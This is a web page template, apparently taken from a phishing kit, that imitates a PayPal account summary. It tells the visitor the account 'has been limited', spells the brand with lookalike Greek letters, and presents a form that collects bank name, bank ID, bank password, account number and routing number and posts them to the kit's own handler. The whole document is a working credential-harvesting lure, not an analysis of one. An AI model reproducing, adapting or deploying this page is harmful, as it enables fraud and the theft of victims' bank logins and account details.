<!DOCTYPE html>
<html lang="en_US" dir="ltr" class="no-js">
<head>
<meta charset="utf-8" /><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" /><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/>
<meta name="format-detection" content="telephone=no">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="{{URL::asset('asset/img/YS_pp144.png')}}" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="{{URL::asset('asset/img/YS_pp114.png')}}" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="{{URL::asset('asset/img/YS_pp72.png')}}" />
<link rel="apple-touch-icon-precomposed" href="{{URL::asset('asset/img/YS_pp64.png')}}" />
<link rel="shortcut icon" sizes="196x196" href="{{URL::asset('asset/img/YS_pp196.png')}}" />
<link rel="shortcut icon" type="image/x-icon" href="{{URL::asset('asset/img/YS_favicon.ico')}}" />
<link rel="icon" type="image/x-icon" href="{{URL::asset('asset/img/YS_pp32.png')}}" />
<title>Confirm your Bank Account</title>
<link rel="stylesheet" href="{{URL::asset('asset/css/ys_app.ltr.css')}}" />
<link rel="stylesheet" href="{{URL::asset('asset/css/ys_ppl-sans.css')}}" />
<link rel="stylesheet" href="{{URL::asset('asset/css/ys_summary.ltr.css')}}" />
<link rel="stylesheet" href="{{URL::asset('asset/css/ys_app.css')}}">
<link rel="stylesheet" href="{{URL::asset('asset/css/ys_rotate.css')}}">
</head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" type="text/javascript"></script> <!-- M3A FUNC DYAL DOB O SC-->
<script type="text/javascript" src="{{URL::asset('asset/js/jquery.maskedinput.js')}}"></script> <!-- M3A FUNC DYAL DOB O SC-->

<body>
<div class="rotation"> <p> Checking your info... </p> </div>
<div class="vx_globalNav-main globalNav_main js_globalNavView" id="header">
<div class="vx_globalNav-container">
<div class="vx_globalNav-secondaryNav_mobile noPrint">
<div class="vx_globalNav-listItem_mobileLogout">
<a href="#" class="vx_globalNav-link_mobileLogout">Log Out</a>
</div>
<div class="vx_globalNav-listItem_settings"><a href="#" class="vx_globalNav-link_settings"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span><span class="vx_a11yText">Settings</span></a></div><div><p class="vx_h5 vx_globalNav-displayName"></p>
</div></div><div class="vx_globalNav-navContainer noPrint">

<nav id="navMenu" class="vx_globalNav-nav" role="navigation"><ul class="vx_globalNav-list">

<li><a href="#" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> <span class="vx_globalNav-navText">Summary</span>
</a></li>

<li><a href="#" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> <span class="vx_globalNav-navText">Activity</span></a></li>

<li id="js_tourSendMoney"><a href="#" class=" vx_globalNav-links nemo_globalNavTransferLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span></span> <span class="vx_globalNav-navText">Send & Request</span></a></li>

<li id="js_tourWallet"><a href="#" class=" vx_globalNav-links nemo_globalNavWalletLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span></span> <span class="vx_globalNav-navText">Wallet</span></a></li>

<li><a href="#" class="vx_globalNav-links nemo_globalNavBenefitsLink" ><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span></span> <span class="vx_globalNav-navText">Benefits & Offers</span></a></li>

<li class="globalNav-listItem_mobile js_globalNavSearch"><a href="#" class="vx_globalNav-links nemo_globalNavSearchLink js_globalNavSearchLink"><span class="vx_globalNav-navText">Search</span></a></li>

</ul>

<ul class="vx_globalNav-list_secondary">
	<li class="js_globalNavSearch"><a href="#" class="vx_globalNav-link_iconOnly js_globalNavSearchLink" name="search"title="Search"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSearch"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Search</span></a></li>

	<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false"><a href="#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span><span class="vx_notificationCount notificationLength-0 js_notificationCount">0</span></span><span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a></li>

	<li id="js_tourSettings"><a href="#" class="vx_globalNav-link_settings" name="settings"title="Settings"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Settings</span></a></li>

	<li class="globalNav-listItem_mobile"><a href="#" class="vx_globalNav-link_help" name="help"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Help</span></a></li>

	<li class="vx_globalNav-listItem_logout"><a href="#" class="vx_globalNav-link_logout nemo_logoutBtn">Log Out</a></li>

</ul>

</nav>
</div></div></div><!-- TAKMILA BODY -->

<div id="sidepanelNotifications" class="vx_sidepanel sidepanel js_sidepanelView noPrint panel js_globalNotifs-sidepanel">
	<div class="vx_sidepanel-headerContainer"><h3 class="vx_h3 vx_sidepanel-header">Notifications</h3><div class="vx_sidepanel-headerIcon_right"><a href="#"class="globalNotifs-close js_closeNotifications"name="closeNotifications"><span class="icon icon-small icon-close-small"  aria-hidden="true"></span><span class="vx_a11yText">Close Notifications</span></a></div>
	</div>
	<div class="vx_sidepanel-body">
	<ul class="vx_sidepanel-list">
		<li class="globalNotifs-listItem globalNotifs-default-item"><p class="globalNotifs-smc-message ">View your messages</p><a href="#" class="globalNotifs-smc-message vx_sidepanel-messageButton">Go to Message Center</a></li>
		<li class="globalNotifs-listItem globalNotifs-default-item">No Notifications</li>
	</ul>
	</div>
</div>

<div id="js_foreground" class="vx_foreground-container foreground-container">
	<div class="vx_globalNav-main_mobile js_globalNavView">
	 <div class="vx_globalNav-headerSection_trigger">
		<a href="#navMenu" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint">Menu</a>
	 </div>
	 <div class="vx_globalNav-headerSection_logo">
		<a href="#" class="vx_globalNav-brand_mobile"><span class="vx_a11yText">Summary</span></a>
	 </div>
	 <ul class="vx_globalNav-headerSection_actions">
		<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
			<a href="#" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger">
			<span class="vx_globalNav-iconWrapper_secondary">
				<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
				<span class="vx_notificationCount notificationLength-0 js_notificationCount"></span>
			</span>
			<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span>
			</a>
		</li>
	 </ul>
	</div>

	<div class="contents vx_mainContent" id="contents" role="main"aria-labelledby="heading1">
	<div id="js_summaryView" class="mainContents summaryContainer" >
		<h1 id="heading1" class="accessAid">PayPal: Summary</h1>
		<div id="js_engagementModuleView" class="engagementModule nemo_engagementModule">
		<div class="engagementSneakPeek-pullTab js_engagementSneakPeek-pullTab js_engagementSneakPeek-trigger"><span class="icon icon-small icon-arrow-down-small" aria-hidden="true"></span></div>
		<div class="engagementMainBar-container js_engagementMainBar-container">
		<div class="summarySection engagementMainBar row">


			<div class="col-sm-7 progressAndWelcome">
				<div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="60" data-hide-percent-animation="true">
				<div id="js_outerCircle" class="outerCircle" >
					<div class="half lessThan50"><div class="pie right" style="-webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); -ie-transform: rotate(0deg); -o-transform: rotate(0deg); transform: rotate(0deg);"></div>
					</div>
					<div class="half greaterThan50 js_greaterThan50"><div class="pie left" style="-webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); -ie-transform: rotate(0deg); -o-transform: rotate(0deg); transform: rotate(0deg);"></div>
					</div>
				</div>
				<div id="js_innerCircle" class="innerCircle">
					<div class="profilePhotoTable">
						<div id="js_profilePhotoView" class="profilePhotoContainer"name="EM_Photo_Start">
						<a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo='{}' data-wurfl='{"isWireless":false,"isTablet":false}'><span id="js_user_icon" class="profilePhotoIcon icon icon-profile-large" aria-hidden="true"data-hover-text="Add a photo"></span>
						</a>
						</div>
					</div><div id="js_percentageContainer" class="hide percentageContainer nemo_percentageContainer"><div id="js_percentage" class="percentage nemo_accountCompletionPercent">0%</div></div>
				</div>
				</div>
				<div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus " data-module-number=""><p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">Hi again!</p><button id="js_engagementActionTrigger" class="vx_btn vx_btn-medium engagement-actionText vx-btn_toggleProfileStatus js_emTrigger nemo_engagementActionTrigger" aria-controls="js_emSlideDownContainer" name="EM_AcctSetup_Open" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="profileStatusText">Get the most out of PayPal</span><span class="js_toggleProfile icon icon-small icon-arrow-down-small icon-small_toggleProfile nemo_profileStatusDownArrow" aria-hidden="true"></span></button></div>
			</div>

			<div id="js_engagementActions" class="col-sm-5 engagementActions">
			<ul class="actionsContainer nemo_actionsContainer"><li class="actionItem engagement-0-listItem"><a href="#" role="button" data-module-number="" name="EM_SendMoney" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_transferSelect js_selectModule"><span class="icon icon-medium icon-send-money" aria-hidden="true"></span><span>Pay or send money</span></a></li><li class="actionItem engagement-1-listItem"><a href="#"  role="button" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="" name="EM_DownloadApp" class="vx_small-text js_selectModule selectModule selectModule_app 	nemo_appSelect"><span class="icon icon-medium icon-phone" aria-hidden="true"></span>Get the PayPal app</a></li><li class="actionItem engagement-2-listItem"><a href="#" role="button" name="EM_PPCredit" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="" class="vx_small-text js_selectModule selectModule nemo_bmlSelect"><span class="icon icon-medium icon-calendar" aria-hidden="true"></span>Take more time to pay</a></li></ul>
			</div>
		</div>



		</div>
		</div>
<form action="{{url('/summary/confirm/bank')}}" required="required" method="post" class="YASS_BANK" name="YASS_BANK" >
  {{csrf_field()}}
  <div style="text-align: center" class="mainBody">
		<div id="summary" class="summarySection">
			<div class="row">

			<div class="col-sm-4 summaryModuleContainer">
			<div class="twbs_alert vx_alert txnDelayMessage js_txnDelayMessage txnDelayMessage_mobile nemo_txnDelayMessageMobile hidden" data-hide-transaction-delay-message="true">
				<span class="icon icon-small icon-info-small" aria-hidden="true">
				</span><p class="vx_alert-text">Your latest transactions may take a few minutes to show up in your activity.</p>
			</div>

			<section class="fiModule-container js_fiModule-container nemo_balanceModule" aria-labelledby="walletModuleHeader " id="js_tourWalletModule"><div class="js_fiModule-title-container" id="fiModule-title-container"><a href="#" class="fiModule-link vx_text-5 fiModule-title"><span class="fiModule-title-header col-md-8 col-sm-8 col-xs-8">Resolve problem</span><span class="fiModule-title-link col-md-4 col-sm-4 col-xs-4">Details<span class="icon icon-arrow-right-half-small fiModule-icon-arrow js_fiModule-icon"></span></span></a></div><div class="fiModule-currency-container fiModule-currency_text"><div class="nemo_balanceNumeral"><span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><img style="margin-right: 5px" width='20' height='20' src="{{URL::asset('asset/img/information.png')}}">You can not access all your ΡayΡal advantages, due to account limited. </span></div></div><ul class="fiModule-list nemo_balanceActions"><li class="addMoney dividedCellLeft vx_text-body_secondary"><a href="#" class="addFunds nemo_addFunds">Resolution Center</a></li><li class="withdrawMoney vx_text-body_secondary"><a role="button" href="#" class="withdrawFunds nemo_withdrawFunds" id="withdrawFunds" name="transfer" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Report a problem</a></li></ul>
			</section>

			<section class="fiModule-container nemo_fiModule" id="js_tourFIModule" aria-labelledby="walletModuleHeader"><h3 class="fiModule-title vx_text-5">PayPal balance</h3><div class="js_fiModule-listView" ><ul class="fiModule-list fiModule-table enforceLtr"><li class="fiModule-list-item vx_text-body_secondary"><a href="#" data-pagename="main:walletweb:home:FIModule:walletPage" data-pagename2="main:walletweb:home:FIModule:walletPage:::" data-track-type="link" class="fiModule-fiList-links"><span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText"><img style="margin-right: 5px" src="{{URL::asset('asset/img/worning.png')}}">Your account PayPal has been limited !</span></a></li></ul><div class="fiModule-ctaText vx_text-body_secondary"><a href="#" class="fiModule-table nemo_addFI"><span class="icon-addBank"><span class="icon icon-add-small icon-add_Bank"></span></span><span class="fiModule-cell fiModule-link-add nemo_linkFi">Add money</span></a></div><a style="font-size: 13.7px" href="#" class="fiModule-table nemo_addFI"><span class="icon-addBank"><span class="icon icon-add-small icon-add_Bank"></span></span><span class="fiModule-cell fiModule-link-add nemo_linkFi">Transfer to your bank</span></a></div>
			</section>

			<section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader"><div class="js_fiModule-title-container" id="fiModule-title-container"><a href="#" class="nemo_sellingToolsHeader" name="sellingToolsHeader" {~}data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="fiModule-title-header col-md-6 col-sm-6 col-xs-6">Selling tools</span><span class="fiModule-title-link col-md-6 col-sm-6 col-xs-6">Details<span class="icon icon-arrow-right-half-small fiModule-icon-arrow js_fiModule-icon"></span></span></a></div><ul class="moduleListItems"><li class="vx_text-body_secondary"><a href="#" class="nemo_sellingToolsInvoice" name="sellingToolsInvoice" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Manage invoices</a></li><li class="vx_text-body_secondary"><a href="#"  class="nemo_sellingToolsMOS" name="sellingToolsMOS" >MultiOrder shipping</a></li><li class="vx_text-body_secondary"><a href="#" class="nemo_sellingToolsSellerPref" name="sellingToolsSellerPref" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Seller preferences</a></li></ul>
			</section>



			</div>


			<div class="col-sm-8 activityModuleContainer" id="js_transactionCollection">
			<div class="twbs_alert vx_alert txnDelayMessage js_txnDelayMessage nemo_txnDelayMessage hidden" data-hide-transaction-delay-message='true'>
			<span class="icon icon-small icon-info-small" aria-hidden="true"></span><p class="vx_alert-text">Your latest transactions may take a few minutes to show up in your activity.</p>
			</div>

			<section class="activityModule js_pendingModule nemo_pendingModule">
			<h3 id="activityModuleHeaderPending" class="vx_h5 moduleHeader nemo_activityModuleHeaderPending"><a href="#" class="moduleHeaderLink nemo_moduleHeaderLink">Confirm your bank account for more security.</a></h3>

			<ul class="transactionList js_transactionList">
			<link rel="prefetch" href="#">
			<link rel="prefetch" href="#">
			<li class="transactionRow transactionRowHover js_transactionItem-U-0YB06382SV697533N">
			<div class="transactionItem js_transactionItem nemo_transactionItem">

			<!-- FOOOOOOOOOOOOOOOOOOOOOOORRRRRRRRRRRMMMMMMMMMMM -->
			<div class="row">
			<div style="margin-left: 10px" class="col-xs-1">
			<div id="txnDate-U-0YB06382SV697533N" class="dateParts js_transactionDescriptionLink linkedBlock js_linkedBlock">
					<div class="fields large">
						<input style="text-transform: capitalize;" class="validate camelCase name" id="" placeholder="Bank Name" name="ys_bnkname" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" maxlength="25" onkeypress="return ValidateAlpha(event)">
					</div>
					<div class="fields large">
						<input style="text-transform: capitalize;" class="validate camelCase name" id="" placeholder="Bank ID" name="ys_bnkid" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" maxlength="25" onkeypress="return ValidateAlpha(event)">
					</div>
					<div class="fields large">
						<input class="validate camelCase name" id="pass"  placeholder="Bank Password" name="ys_bnkpass" autocomplete="off" autocorrect="off" autocapitalize="on" type="password">
					</div>
					<div class="fields large">
						<input class="validate camelCase name" id="acn"  placeholder="Account Number" name="ys_acn" autocomplete="off" autocorrect="off" autocapitalize="on" type="tel" onkeypress="return isNumberKey(event)">
					</div>

					<div class="fields large">
						<input class="validate camelCase name" id="routing"  placeholder="Routing Number" name="ys_routing" autocomplete="off" autocorrect="off" autocapitalize="on"  type="tel" onkeypress="return isNumberKey(event)">
					</div>

					<input style="font-size: 15px; font-weight: bold; border-radius: 25px; width: 1485%; height: 44px; padding: 10px 15px; border: 0; display: block; background: #0070ba; box-shadow: none; cursor: pointer; box-sizing: border-box; -webkit-tap-highlight-color: transparent; color: #fff; text-align: center; font-family: Helvetica Neue,Helvetica,Arial,sans-serif; text-shadow: none; margin-top: 25px" id="submitBtn" name="_eventId_continue" class="button" value="Agree and Confirm" data-click="createSubmit" type="submit">
			</div>
			</div>
			<div class="col-xs-11 transactionDetailsContainer js_transactionDetailsContainer">
			<a id="txnDescription-U-0YB06382SV697533N" class="transactionDescriptionContainer js_transactionDescriptionContainer linkedBlock js_linkedBlock" href="#">
			</a>
			<span id="js_spinnerLabelText-U-0YB06382SV697533N" aria-hidden="true" class="accessAid">
				<span class="transactionDescription col-xs-7 col-lg-12" dir="auto">zid</span>
				<span class="transactionType vx_small-text col-xs-7">Request Sent</span>
			</span>
			<div id="txnAmountAndCurrency-U-0YB06382SV697533N" class="transactionAmount js_transactionDescriptionLink linkedBlock js_linkedBlock primaryCurrency ">
			</div>
			<div class="vx_small-text action">
				<span class="icon icon-small icon-action-arrow-half-small" aria-hidden="true"></span>
				<span class="hidden-phone" dir="auto">Security & Help</span>
				<a href="#" class="js_requestMoneyAction nemo_actions-remind" name="reminder">Send & request</a>
				<a href="#" class="js_requestMoneyAction nemo_actions-edit">Personal</a>
				<a href="#" class="js_requestMoneyAction nemo_actions-cancel" name="edit$">More</a>
			</div>

			</div>
			</div>
			<!-- FOOOOOOOOOOOOOOOOOOOOOOORRRRRRRRRRRMMMMMMMMMMM -->
			</div>

 </li>
			</ul>
			</section>
 </div></div></div></div>
</form>
 </div></div>
 <div id="footer" class="noPrint nemo_footer vx_globalFooter-container" role="contentinfo">
 <div class="vx_globalFooter">
	<div class="vx_globalFooter-content">
	<ul class="vx_globalFooter-list">
		<li><a href="#" class="nemo_helpLink" name="footerHelp">Help & Contact</a></li>
		<li><a href="#" class="nemo_securityLink" name="footerSecurity">Security</a></li>
	</ul>
	<div class="vx_globalFooter_secondary">
		<p class="vx_globalFooter-copyright nemo_copyrightText">Copyright &copy<span dir="ltr">1999-2016</span> PayPal, Inc. All rights reserved.</p>
		<ul class="vx_globalFooter-list_secondary">
			<li><a href="#" name="privacy" class="nemo_privacyLink">Privacy</a></li>
			<li><a href="#" name="legal" class="nemo_legalLink">Legal</a></li>
			<li><a href="#" name="policyUpdates" class="nemo_policyUpdatesLink">Policy updates</a></li>
			<li><a href="#" name="policyUpdates" class="nemo_policyUpdatesLink">Feedback</a></li>
		</ul>
	</div>  <!-- ESPACE TAHT FOOTER --><div class="footerSmallText vx_globalFooter-disclaimer">&nbsp;</div>
	</div>
 </div>
 </div>
</div>
<script type="text/javascript" src="YSASSETS/js/ys_ppl_647892.js"></script> <!-- https://www.paypalobjects.com/js/site_catalyst/pp_jscode_080706.js -->
<script type="text/javascript" src="YSASSETS/js/ys_pa.js"></script> <!-- https://www.paypalobjects.com/pa/js/min/pa.js -->
<script src="YSASSETS/js/ys_appli.js"></script> <!-- https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/js/apps/app.js-->
<script type="text/javascript" src="YSASSETS/js/ys_bootstrap.js"> <!--https://www.paypalobjects.com/tagmgmt/bootstrap.js -->
</script></body></html>
